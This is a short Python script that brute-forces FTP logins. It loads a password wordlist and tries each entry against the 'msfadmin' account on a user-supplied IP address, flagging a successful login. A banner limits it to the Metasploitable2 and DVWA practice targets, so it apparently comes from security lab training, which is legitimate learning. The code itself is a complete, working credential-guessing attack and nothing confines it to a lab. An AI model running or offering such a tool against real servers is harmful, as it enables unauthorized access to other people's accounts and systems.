from ftplib import FTP

ascii_art = """
 ____  ____  _   _ _____ _____   _____ ___  ____   ____ _____             
| __ )|  _ \| | | |_   _| ____| |  ___/ _ \|  _ \ / ___| ____|            
|  _ \| |_) | | | | | | |  _|   | |_ | | | | |_) | |   |  _|              
| |_) |  _ <| |_| | | | | |___  |  _|| |_| |  _ <| |___| |___             
|____/|_| \_\\___/  |_| |_____| |_| _ \___/|_|_\_\\____|_____|      ____  
 _ __ ___   ___  __ _| |_ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
| '_ ` _ \ / _ \/ _` | __/ __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
| | | | | |  __/ (_| | |_\__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
|_| |_| |_|\___|\__,_|\__|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
                             |_|                                          
"""

def bruteforce(ip, user, password):
    try:
        ftp = FTP(ip)
        print(f"ID : {user} PASSWORD : {password}")
        res = ftp.login(user, password)
        if "230" in res and "successful" in res:
            print("[+]  FIND PASSWORD !!!")
        print(res)
        ftp.quit()

    except Exception as ex:
        print(f"connect error: {ex}")

def display_welcome():
    print(ascii_art)
    print("\nONLY DVWA OR MEATSPLOITABLE2\n")

def get_passwords_from_file(filename):
    try:
        with open(filename, 'r') as file:
            passwords = file.readlines()
            return [password.strip() for password in passwords]
    except FileNotFoundError:
        print(f"Error: {filename} not found.")
        return []

def main():
    display_welcome()

    ip = input("Please enter the IP address: ").strip()
    password_file = input("Enter the path to your password file: ").strip()

    passwords = get_passwords_from_file(password_file)

    if not passwords:
        return

    try:
        for password in passwords:
            bruteforce(ip, 'msfadmin', password)
    except KeyboardInterrupt:
        print("\nInterrupted by user.")

if __name__ == '__main__':
    main()




